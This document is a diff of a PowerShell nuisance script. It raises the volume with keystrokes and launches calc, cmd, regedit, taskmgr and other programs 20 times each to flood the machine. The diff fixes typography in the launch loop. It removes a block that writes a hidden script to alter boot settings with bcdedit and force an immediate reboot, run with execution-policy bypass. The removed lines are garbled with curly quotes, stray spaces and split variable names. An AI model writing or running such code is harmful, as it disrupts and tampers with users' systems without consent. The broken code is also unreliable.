@@ -42,18 +42,8 @@ $WScript = New-Object -com wscript.shell
 1..50 | % { $WScript.SendKeys([char]175) }
 
 $processes = @("calc.exe", "explorer.exe", "notepad.exe", "cmd.exe", "regedit.exe", "msinfo32.exe", "taskmgr.exe")
-for ($i = 1; $i-le 20; $i++) {
+for ($i = 1; $i -le 20; $i++) {
     foreach ($process in $processes) {
-        Start-Process –Filepath $process –NoNewWindow
+        Start-Process -FilePath $process -NoNewWindow
     }
 }
-
-$startupRepairScriptContent = @'
-bcdedit /set {default} {default} recoveryenabled yes
-bcdedit /set {default} bootstatuspolicy ignoreallfailures
-shutdown /r /t 0
-'@
-$startupRepairScriptPath = "$PWD\startupRepair.ps1"
-Set–content –path $startupRepair Script Path –value $startupRepair Script Content
-
-Start–Process –windowstyle hidden –filepath “powershell. exe” –argumentlist “–noprofile –executionpolicy bypass –file `”$startuprepairscriptpath`””
